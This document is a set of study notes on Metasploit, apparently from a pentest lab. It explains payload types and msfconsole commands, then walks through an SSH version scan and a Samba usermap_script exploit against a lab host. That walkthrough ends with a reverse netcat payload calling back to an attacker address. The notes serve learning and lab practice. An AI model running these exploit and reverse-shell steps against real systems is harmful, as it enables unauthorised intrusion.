# Metasploit Framework - Setup and Documentations

```
Documentations on the scripts in Metasploit Framework
```

## Information
### Payloads in Metasploit
- 3 Types of Payload
    - Singles : Payloads that are self-contained and standalone
        + Singles do not depend on other programs to run
    - Stagers : Stagers are small programs that *establish and main communications* between the attacker and victim
        + Usually to enable downloading of stages
        - Examples
            + Creating a backdoor
    - Stages : Payload components that are downloaded by the stagers 
        + usually Big
  
- How to understand payload descriptions in Metasploit
    + A single payload : windows/shell_bind_tcp
    - Stager-stages : windows/shell/bind_tcp
        - Where
            + bind_tcp : Stager
            + shell : stage
        - Summary
            + Map stager under the stage
            + *windows/stage/stager*

## Setup
### Pre-Requisites

### Dependencies

### Installing
    
## Documentation
### Scripts/Files
+ msfconsole    : Metasploit Framework's Console Shell
+ msfvenom      : MSF Backdoor utility

### Synopsis/Syntax

- To startup the framework
    ```console
    $> msfconsole [{options} [arguments]...]
    ```
    
### Parameters

### Commands
#### msfconsole
+ search [keyword]              : Look for possible exploits containing the keyword
    ```console
    msf5 > search ssh_version
    ```
+ use [path-to-exploit-script]  : Use a specific expoit, payload or auxiliary
- show [keyword]                : Displays information for the specified keyword
    - Examples
        + show options          : Display options for the current modules
        + show payloads         : Displays all payloads registered
- set [option] [value]          : Configure *option* to have a value of *value*
    - Options
        + PAYLOAD [payload-path]    : Set a payload
        + LHOST [attacker-IP]       : Sets the Local Host; Normally used to create a reverse connection to your machine after the attack succeeds
        + RHOST [target-IP]         : Sets the Remote/Target Host; Refers to the IP address of the target host
+ run [auxiliary-module]        : Execute *auxiliary* mode
+ exploit                       : Start *exploit* modules/execution process
+ back                          : Go back to the original console prompt
+ clear                         : Clear the screen
+ exit                          : Exit from metasploit
+ help                          : Show instructionsl

### Usage

- Information Gathering using Auxiliary Module
    - Launch msfconsole
        ```console
        $> msfconsole
        ```

    - Search ssh_version in msfconsole
        + *search ssh_version*
            ```console
            msf5> search ssh_version
            ```
    - Find a module name returned by Metasploit
        + auxiliary/scanner/ssh/ssh_version

    - Use auxiliary module
        - run *use auxiliary/scanner/ssh/ssh_version*
            + Your mode will be changed to auxiliary mode
            ```console
            msf5 > use auxiliary/scanner/ssh/ssh_version
            ```
            
    - Show options to execute
        + *show options*
            ```console
            msf5 > show options
            ```

    - Set RHOSTS as the target server's IP address (Metasploitable IP)
        + command : *set RHOSTS [target-IP]
        ```console
        msf5 auxiliary(scanner/ssh/ssh_version) > set RHOSTS 10.0.2.5
        ```
        
    - Execute the auxiliary scanner
        + *run*
        ```console
        msf5 auxiliary(scanner/ssh/ssh_version) > run
        ```

- Samba "usermap script" exploit
    - Sequence of commands
        ```console
        $> msfconsole
        
        msf5 > use exploit/multi/samba/usermap_script
        msf5 > options
        msf5 > set RHOST 10.0.2.5
        msf5 > exploit
        ```
    - Different Payloads
        ```console
        msf5 > show payloads
        ```
    - Reverse Netcat
        + Ask the server to connect to us (Kali)
            ```console
            msf5 > set PAYLOAD cmd/unix/reverse_netcat
            msf5 > show options
            msf5 > set LHOST 10.0.2.4
            msf5 > exploit
            ```

### Terminologies
+ LHOST [attacker-IP]   : Sets the Local Host; Normally used to create a reverse connection to your machine after the attack succeeds
+ RHOST [target-IP]     : Sets the Remote/Target Host; Refers to the IP address of the target host    
+ Attack Vectors        : Methods of attacks
+ Attack Surface Area 	: Amount of loopholes/vulnerabilities/penetration methods in a program


